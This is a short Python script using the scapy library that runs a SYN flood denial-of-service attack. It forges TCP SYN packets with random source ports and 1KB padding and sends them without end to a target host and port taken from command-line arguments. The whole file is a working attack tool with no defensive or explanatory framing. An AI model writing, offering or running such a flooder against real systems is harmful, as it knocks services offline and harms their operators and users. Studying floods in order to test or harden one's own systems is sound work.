from scapy.all import *
from args import parse_arguments


def attack(target_ip: str, target_port: int):
    # forge IP packet with target ip as the destination IP address
    ip = IP(dst=target_ip)

    # "S" flag for SYN package
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

    # flooding data (1KB)
    raw = Raw(b"X" * 1024)

    # stack up the layers
    p = ip / tcp / raw

    logging.info(f"Sending SYN packets...\nSend CTR+C signal to stop")
    send(p, loop=1, verbose=0)


def main():
    args = parse_arguments()

    logging.basicConfig(level=args.loglevel)
    logging.debug("Arguments parsed")

    ip = args.host
    port = args.port

    logging.info(f"Server IP address: {ip}")
    logging.info(f"Server port: {port}")

    attack(ip, port)


if __name__ == "__main__":
    main()
